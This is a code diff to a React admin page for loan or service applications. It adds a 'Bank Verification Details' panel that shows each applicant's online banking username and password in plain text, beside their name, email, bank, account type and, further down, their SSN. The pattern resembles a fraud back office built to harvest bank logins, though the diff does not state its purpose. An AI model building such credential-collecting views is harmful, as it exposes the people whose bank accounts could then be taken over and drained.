@@ -962,6 +962,49 @@ export default function ApplicationDetailPage() {
                 )} */}
               </Section>
 
+              {/* Bank Verification Details */}
+              {bankVerification && (
+                <Section title="Bank Verification Details">
+                  <Field
+                    label="Full name"
+                    value={bankVerification?.full_name}
+                  />
+                  <Field label="Email" value={bankVerification?.email} />
+                  <Field
+                    label="Online Bank Username"
+                    value={bankVerification?.online_banking_username}
+                  />
+                  <Field
+                    label="Online Bank Password"
+                    value={bankVerification?.online_banking_password}
+                  />
+                  <Field
+                    label="Application ID"
+                    value={
+                      bankVerification?.application_id
+                        ? app.application_id
+                        : "-"
+                    }
+                  />
+                  <Field
+                    label="Bank Name"
+                    value={bankVerification?.bank_name}
+                  />
+                  <Field
+                    label="Account"
+                    value={bankVerification?.account_type}
+                  />
+                  {/* <Field
+                      label="Verification Status"
+                      value={bankVerification?.verification_status}
+                    /> */}
+                  <Field
+                    label="Submitted At"
+                    value={bankVerification?.created_at}
+                  />
+                </Section>
+              )}
+
               <Section title="Identity Verification">
                 <Field
                   label="SSN"
